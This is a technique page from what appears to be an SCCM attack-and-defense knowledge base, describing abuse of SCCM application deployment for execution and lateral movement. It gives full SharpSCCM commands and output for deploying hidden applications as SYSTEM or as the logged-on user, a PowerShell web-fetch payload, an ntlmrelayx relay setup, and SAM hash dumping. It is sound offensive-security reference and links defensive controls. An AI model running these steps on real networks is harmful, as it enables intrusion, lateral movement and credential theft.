# EXEC-1

## Description
Application deployment

## MITRE ATT&CK TTPs
- [TA0002](https://attack.mitre.org/tactics/TA0002) - Execution
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
Permitted security roles:
- Full Administrator
- Application Administrator

## Summary
SCCM allows administrators to deploy applications located at a specified UNC path to client devices and can select whether they are executed as `SYSTEM`, as the currently logged in user, or as a specific user.

## Impact
An attacker could use this technique to deploy an application on a remote client device as `SYSTEM`, as the currently logged in user, or as a specific user. This can be abused to conduct lateral movement by executing a C2 agent binary from a reachable UNC path (e.g., a readable file share) or by specifying the UNC path of an attacker relay server and forwarding the user's NTLM authentication to another system where they have administrator privileges.

New applications can also be hidden from being displayed in the Configuration Manager Console software, making them more difficult to detect.

## Defensive IDs
- [DETECT-4: Monitor application deployment logs in the site's Audit Status Messages](../../../defense-techniques/DETECT/DETECT-4/detect-4_description.md)
- [PREVENT-9: Enforce MFA for SMS Provider calls](../../../defense-techniques/PREVENT/PREVENT-9/prevent-9_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Subtechniques
- EXEC-1.1 - Deploy binary or script from share
- EXEC-1.2 - Deploy as user to relay NTLM authentication

## Examples

Note that any user with the `Application Administrator` role can also perform this attack, but they will not be able to conduct the first step below to confirm their role, nor will they be able to force clients to immediately update their machine policy and execute pending application deployments. They will have to wait for the machine policy to be polled automatically by the client, which by default, occurs every 60 minutes.

1. Confirm that the current domain context has the necessary privileges to define a collection of systems and deploy applications to it by executing:

    ```
    SharpSCCM.exe get class-instances SMS_Admin -sms <SMS_PROVIDER> -sc <SITECODE> -p CategoryNames -p CollectionNames -p LogonName -p RoleNames --no-banner

    [+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
    [+] Executing WQL query: SELECT AdminID,CategoryNames,CollectionNames,LogonName,RoleNames FROM SMS_Admin
    -----------------------------------
    SMS_Admin
    -----------------------------------
    CategoryNames: All
    CollectionNames: All Systems, All Users and User Groups
    LogonName: MAYYHEM\sccmadmin
    RoleNames: Full Administrator
    -----------------------------------
    [+] Completed execution in 00:00:00.6824409
    ```

### EXEC-1.1

2. Execute the following command, which creates a device collection, adds the specified device or user to the collection, creates an application using the specified installation path, deploys the application to the device collection, waits for the deployment to complete (the default is 5 minutes but may need to be increased in large hierarchies), then cleans up the created objects:

    ```
    SharpSCCM.exe exec -p calc.exe -d CLIENT -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner

    [+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
    [+] Creating new device collection: Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
    [+] Successfully created collection
    [+] Found resource named CLIENT with ResourceID 16777219
    [+] Added CLIENT (16777219) to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
    [+] Waiting for new collection member to become available...
    [+] New collection member is not available yet... trying again in 5 seconds
    [+] Successfully added CLIENT (16777219) to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c
    [+] Creating new application: Application_f8250c0c-efc9-4111-80e7-0518db02978a
    [+] Application path: calc.exe
    [+] Updated application to hide it from the Configuration Manager console
    [+] Updated application to run in the context of the logged on user
    [+] Successfully created application
    [+] Creating new deployment of Application_f8250c0c-efc9-4111-80e7-0518db02978a to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042)
    [+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
    [+] Successfully created deployment of Application_f8250c0c-efc9-4111-80e7-0518db02978a to Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042)
    [+] New deployment name: Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install
    [+] Waiting for new deployment to become available...
    [+] New deployment is available, waiting 30 seconds for updated policy to become available
    [+] Forcing all members of Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c (PS100042) to retrieve machine policy and execute any new applications available
    [+] Waiting 300 seconds for execution to complete...
    [+] Cleaning up
    [+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install deployment
    [+] Deleted the Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install deployment
    [+] Querying for deployments of Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install
    [+] No remaining deployments named Application_f8250c0c-efc9-4111-80e7-0518db02978a_PS100042_Install were found
    [+] Found the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
    [+] Deleted the Application_f8250c0c-efc9-4111-80e7-0518db02978a application
    [+] Querying for applications named Application_f8250c0c-efc9-4111-80e7-0518db02978a
    [+] No remaining applications named Application_f8250c0c-efc9-4111-80e7-0518db02978a were found
    [+] Deleted the Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c collection (PS100042)
    [+] Querying for the Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c collection (PS100042)
    [+] Found 0 collections matching the specified CollectionID
    [+] No remaining collections named Devices_7a44b4d8-70d3-4d9c-9147-af3bf1d0fb9c with CollectionID PS100042 were found
    [+] Completed execution in 00:06:20.5442081
    ```

    Note that by default, the application is executed in the context of the currently logged on user, but can be executed as `SYSTEM` using the `-s` option.

    The path (`calc.exe`) can be substituted for a UNC path where a binary resides (e.g., a C2 agent binary on a readable file share, `\\share\bin.exe`). 

    Alternatively, the installation path can be set to the path for PowerShell to execute a script in on the device.

    ```
    SharpSCCM.exe exec -d <DEVICE> -p "powershell iwr http://192.168.57.131"

    _______ _     _ _______  ______  _____  _______ _______ _______ _______
    |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
    ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

    [+] Querying the local WMI repository for the current management point and site code
    [+] Connecting to \\127.0.0.1\root\CCM
    [+] Current management point: ATLAS.APERTURE.SCI
    [+] Site code: PS1
    [+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
    [+] Found 0 collections matching the specified
    [+] Creating new device collection: Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
    [+] Successfully created collection
    [+] Found resource named <DEVICE> with ResourceID 16777281
    [+] Added <DEVICE> 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
    [+] Waiting for new collection member to become available...
    [+] New collection member is not available yet... trying again in 5 seconds
    [+] Successfully added <DEVICE> 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
    [+] Creating new application: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
    [+] Application path: powershell iwr http://192.168.57.131
    [+] Updated application to run in the context of the logged on user
    [+] Successfully created application
    [+] Creating new deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
    [+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
    [+] Successfully created deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
    [+] New deployment name: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
    [+] Waiting for new deployment to become available...
    [+] New deployment is available, waiting 30 seconds for updated policy to become available
    [+] Forcing all members of Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061) to retrieve machine policy and execute any new applications available
    [+] Waiting 1 minute for execution to complete...
    [+] Cleaning up
    [+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
    [+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
    [+] Querying for deployments of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
    [+] No remaining deployments named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install were found
    [+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
    [+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
    [+] Querying for applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
    [+] No remaining applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a were found
    [+] Deleted the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
    [+] Querying for the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
    [+] Found 0 collections matching the specified CollectionID
    [+] No remaining collections named Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 with CollectionID PS100061 were found
    [+] Completed execution in 00:01:54.5997840
    ```

    Installation paths can include other programs and their arguments as well, so there are many possible ways to abuse this functionality.

### EXEC-1.2
This technique to elicit NTLM authentication is no different than application deployment via EXEC-1.1, except that the installation path of outher malicious application is set to a UNC path on a relay server that the attacker controls. That way, when each SCCM client in the deployment group attempts to install the new application, it sends NTLM authentication to the attacker's listening machine via SMB (or HTTP, if WebClient is enabled). This is advantageous in scenarios where execution of PowerShell or a C2 agent binary is blocked or could result in detection. 

Because SCCM has an option to install application deployments either as the logged-on user, a specific user, or as SYSTEM, an attacker can capture/relay credentials for users associated with a specific computer using SCCM as well.

2. Identify where the target user has user device affinity or was the last to log on ([RECON-5](../../RECON/RECON-5/RECON-5_description.md)).

3. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the relay target and the SMB service:

    ```
    # impacket-ntlmrelayx -smb2support -ts -ip <NTLMRELAYX_LISTENER_IP> -t <RELAY_TARGET_IP>
    Impacket v0.11.0 - Copyright 2023 Fortra

    [2024-02-27 21:30:18] [*] Protocol Client MSSQL loaded..
    [2024-02-27 21:30:18] [*] Protocol Client LDAP loaded..
    [2024-02-27 21:30:18] [*] Protocol Client LDAPS loaded..
    [2024-02-27 21:30:18] [*] Protocol Client RPC loaded..
    [2024-02-27 21:30:18] [*] Protocol Client HTTPS loaded..
    [2024-02-27 21:30:18] [*] Protocol Client HTTP loaded..
    [2024-02-27 21:30:18] [*] Protocol Client IMAPS loaded..
    [2024-02-27 21:30:18] [*] Protocol Client IMAP loaded..
    [2024-02-27 21:30:18] [*] Protocol Client SMTP loaded..
    [2024-02-27 21:30:18] [*] Protocol Client SMB loaded..
    [2024-02-27 21:30:19] [*] Protocol Client DCSYNC loaded..
    [2024-02-27 21:30:20] [*] Running in relay mode to single host
    [2024-02-27 21:30:20] [*] Setting up SMB Server
    [2024-02-27 21:30:20] [*] Setting up HTTP Server on port 80
    [2024-02-27 21:30:20] [*] Setting up WCF Server
    [2024-02-27 21:30:20] [*] Setting up RAW Server on port 6666

    [2024-02-27 21:30:20] [*] Servers started, waiting for connections
    ```

4. Use the same command and technique noted in EXEC-1.1, but instead of specifying the path to a binary or script, specify the UNC path to a system where `ntlmrelayx` is running to negotiate NTLM authentication and impersonate the target user to another target device:

    ```
    SharpSCCM.exe exec -sms SITE-SMS -sc PS1 -d CLIENT -r 192.168.57.130 --no-banner

    [+] Connecting to \\SITE-SMS\root\SMS\site_PS1
    [+] Creating new device collection: Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2
    [+] Successfully created collection
    [+] Found resource named CLIENT with ResourceID 16777219
    [+] Added CLIENT (16777219) to Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2
    [+] Waiting for new collection member to become available...
    [+] New collection member is not available yet... trying again in 5 seconds
    [+] Successfully added CLIENT (16777219) to Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2
    [+] Creating new application: Application_c263f606-ca9a-4d24-9191-e97207f9cfc9
    [+] Application path: \\192.168.57.130\C$
    [+] Updated application to hide it from the Configuration Manager console
    [+] Updated application to run in the context of the logged on user
    [+] Successfully created application
    [+] Creating new deployment of Application_c263f606-ca9a-4d24-9191-e97207f9cfc9 to Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2 (PS100043)
    [+] Found the Application_c263f606-ca9a-4d24-9191-e97207f9cfc9 application
    [+] Successfully created deployment of Application_c263f606-ca9a-4d24-9191-e97207f9cfc9 to Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2 (PS100043)
    [+] New deployment name: Application_c263f606-ca9a-4d24-9191-e97207f9cfc9_PS100043_Install
    [+] Waiting for new deployment to become available...
    [+] New deployment is available, waiting 30 seconds for updated policy to become available
    [+] Forcing all members of Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2 (PS100043) to retrieve machine policy and execute any new applications available
    [+] Waiting 300 seconds for execution to complete...
    [+] Cleaning up
    [+] Found the Application_c263f606-ca9a-4d24-9191-e97207f9cfc9_PS100043_Install deployment
    [+] Deleted the Application_c263f606-ca9a-4d24-9191-e97207f9cfc9_PS100043_Install deployment
    [+] Querying for deployments of Application_c263f606-ca9a-4d24-9191-e97207f9cfc9_PS100043_Install
    [+] No remaining deployments named Application_c263f606-ca9a-4d24-9191-e97207f9cfc9_PS100043_Install were found
    [+] Found the Application_c263f606-ca9a-4d24-9191-e97207f9cfc9 application
    [+] Deleted the Application_c263f606-ca9a-4d24-9191-e97207f9cfc9 application
    [+] Querying for applications named Application_c263f606-ca9a-4d24-9191-e97207f9cfc9
    [+] No remaining applications named Application_c263f606-ca9a-4d24-9191-e97207f9cfc9 were found
    [+] Deleted the Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2 collection (PS100043)
    [+] Querying for the Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2 collection (PS100043)
    [+] Found 0 collections matching the specified CollectionID
    [+] No remaining collections named Devices_3c8b5c8f-61ef-409e-9045-db4baeee64c2 with CollectionID PS100043 were found
    [+] Completed execution in 00:05:53.8624182
    ```

    After a few minutes, ntlmrelayx should receive a connection from the account:

    ```
    [2024-02-27 21:32:57] [*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.57.101, attacking target smb://192.168.57.50
    [2024-02-27 21:32:57] [*] Authenticating against smb://192.168.57.50 as MAYYHEM/SCCMADMIN SUCCEED
    [2024-02-27 21:32:57] [*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:57] [*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:57] [*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:57] [*] SMBD-Thread-10 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:57] [*] SMBD-Thread-11 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:57] [*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:57] [*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:57] [*] SMBD-Thread-14 (process_request_thread): Connection from 192.168.57.101 controlled, but there are no more targets left!
    [2024-02-27 21:32:58] [*] Target system bootKey: 0xxxx
    [2024-02-27 21:32:58] [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxx:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:xxx:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:xxx:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:xxx:::
    [2024-02-27 21:32:58] [*] Done dumping SAM hashes for host: 192.168.57.50
    ```

    Alternatively, to automatically find the device where `APERTURE\cave.johnson` is the primary user and coerce NTLM authentication from the user to `192.168.57.130`, execute:

    ```
    SharpSCCM.exe exec -u APERTURE\cave.johnson -r 192.168.57.130 --no-banner

    [+] Querying the local WMI repository for the current management point and site code
    [+] Connecting to \\127.0.0.1\root\CCM
    [+] Current management point: ATLAS.APERTURE.SCI
    [+] Site code: PS1
    [+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
    [+] Found 0 collections matching the specified
    [+] Creating new user collection: Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47
    [+] Successfully created collection
    [+] Found resource named APERTURE\cave.johnson (Cave Johnson) with ResourceID 2063597575
    [+] Added APERTURE\cave.johnson (Cave Johnson) 2063597575 to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47
    [+] Waiting for new collection member to become available...
    [+] Successfully added APERTURE\cave.johnson (Cave Johnson) 2063597575 to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47
    [+] Creating new application: Application_4130f5e5-06c8-4631-a20c-7bd78611502d
    [+] Application path: \\192.168.57.130\C$
    [+] Updated application to run in the context of the logged on user
    [+] Successfully created application
    [+] Creating new deployment of Application_4130f5e5-06c8-4631-a20c-7bd78611502d to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 (PS10005F)
    [+] Found the Application_4130f5e5-06c8-4631-a20c-7bd78611502d application
    [+] Successfully created deployment of Application_4130f5e5-06c8-4631-a20c-7bd78611502d to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 (PS10005F)
    [+] New deployment name: Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install
    [+] Waiting for new deployment to become available...
    [+] New deployment is available, waiting 30 seconds for updated policy to become available
    [+] APERTURE\cave.johnson is the primary user of CAVE-JOHNSON-PC
    [+] Forcing CAVE-JOHNSON-PC (16777274) to retrieve user policy and execute any new applications available for APERTURE\cave.johnson
    [+] Found 0 collections matching the specified
    [+] Creating new device collection: Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08
    [+] Successfully created collection
    [+] Found resource named CAVE-JOHNSON-PC with ResourceID 16777274
    [+] Added CAVE-JOHNSON-PC 16777274 to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08
    [+] Waiting for new collection member to become available...
    [+] New collection member is not available yet... trying again in 5 seconds
    [+] Successfully added CAVE-JOHNSON-PC 16777274 to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08
    [+] Creating new application: Application_a594de98-c2bb-4531-a56e-caef0c78633f
    [+] Application path: powershell -EncodedCommand JABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgAFUAcwBlAHIAUwBJAEQALAAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAIABGAFIATwBNACAAQwBDAE0AXwBVAHMAZQByAEwAbwBnAG8AbgBFAHYAZQBuAHQAcwAgAFcASABFAFIARQAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAPQBOAFUATABMACIAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAYwBjAG0AIgA7ACAAJABVAHMAZQByAEkARAA9ACQAQwB1AHIAcgBlAG4AdABVAHMAZQByAC4AVQBzAGUAcgBTAEkARAA7ACAAJABVAHMAZQByAEkARAA9ACQAVQBzAGUAcgBJAEQALgByAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAXwAiACkAOwAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwAgAD0AIAAiAHsAMAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAyADYAfQAiACwAIgB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAAMgA3AH0AIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABNAGUAcwBzAGEAZwBlAEkARAAgAGkAbgAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwApACAAewAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAgAD0AIAAoAFsAdwBtAGkAXQAiAHIAbwBvAHQAXABjAGMAbQBcAFAAbwBsAGkAYwB5AFwAJABVAHMAZQByAEkARABcAEEAYwB0AHUAYQBsAEMAbwBuAGYAaQBnADoAQwBDAE0AXwBTAGMAaABlAGQAdQBsAGUAcgBfAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAEkARAA9ACQATQBlAHMAcwBhAGcAZQBJAEQAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAHIAaQBnAGcAZQByAHMAIAA9ACAAQAAoACIAUwBpAG0AcABsAGUASQBuAHQAZQByAHYAYQBsADsATQBpAG4AdQB0AGUAcwA9ADEAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAGEAcgBnAGUAdABFAG4AZABwAG8AaQBuAHQAIAA9ACAAIgBkAGkAcgBlAGMAdAA6AFAAbwBsAGkAYwB5AEEAZwBlAG4AdABfAFIAZQBxAHUAZQBzAHQAQQBzAHMAaQBnAG4AbQBlAG4AdABzACIAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQA7ACAAJABTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAC4AVAByAGkAZwBnAGUAcgBzACAAPQAgAEAAKAAiAFMAaQBtAHAAbABlAEkAbgB0AGUAcgB2AGEAbAA7AE0AaQBuAHUAdABlAHMAPQAxADUAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIABzAGwAZQBlAHAAIAAzADAAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQB9AA==
    [+] Updated application to run as SYSTEM
    [+] Successfully created application
    [+] Creating new deployment of Application_a594de98-c2bb-4531-a56e-caef0c78633f to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 (PS100060)
    [+] Found the Application_a594de98-c2bb-4531-a56e-caef0c78633f application
    [+] Successfully created deployment of Application_a594de98-c2bb-4531-a56e-caef0c78633f to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 (PS100060)
    [+] New deployment name: Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install
    [+] Waiting for new deployment to become available...
    [+] New deployment is available, waiting 30 seconds for updated policy to become available
    [+] Forcing all members of Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 (PS100060) to retrieve machine policy and execute any new applications available
    [+] Waiting 1 minute for execution to complete...
    [+] Cleaning up
    [+] Found the Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install deployment
    [+] Deleted the Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install deployment
    [+] Querying for deployments of Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install
    [+] No remaining deployments named Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install were found
    [+] Found the Application_a594de98-c2bb-4531-a56e-caef0c78633f application
    [+] Deleted the Application_a594de98-c2bb-4531-a56e-caef0c78633f application
    [+] Querying for applications named Application_a594de98-c2bb-4531-a56e-caef0c78633f
    [+] No remaining applications named Application_a594de98-c2bb-4531-a56e-caef0c78633f were found
    [+] Deleted the Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 collection (PS100060)
    [+] Querying for the Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 collection (PS100060)
    [+] Found 0 collections matching the specified CollectionID
    [+] No remaining collections named Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 with CollectionID PS100060 were found
    [+] Cleaning up
    [+] Found the Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install deployment
    [+] Deleted the Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install deployment
    [+] Querying for deployments of Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install
    [+] No remaining deployments named Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install were found
    [+] Found the Application_4130f5e5-06c8-4631-a20c-7bd78611502d application
    [+] Deleted the Application_4130f5e5-06c8-4631-a20c-7bd78611502d application
    [+] Querying for applications named Application_4130f5e5-06c8-4631-a20c-7bd78611502d
    [+] No remaining applications named Application_4130f5e5-06c8-4631-a20c-7bd78611502d were found
    [+] Deleted the Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 collection (PS10005F)
    [+] Querying for the Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 collection (PS10005F)
    [+] Found 0 collections matching the specified CollectionID
    [+] No remaining collections named Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 with CollectionID PS10005F were found
    [+] Completed execution in 00:02:45.4183430
    ```

## References
- Matt Nelson, [Offensive Operations with PowerSCCM](https://enigma0x3.net/2016/02/29/offensive-operations-with-powersccm/)
- Dave Kennedy and Dave DeSimone, [Owning One to Rule Them All](https://vimeo.com/47978442)
- Chris Thompson, [Relaying NTLM Authentication from SCCM Clients](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
- Chris Thompson, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM/wiki/exec)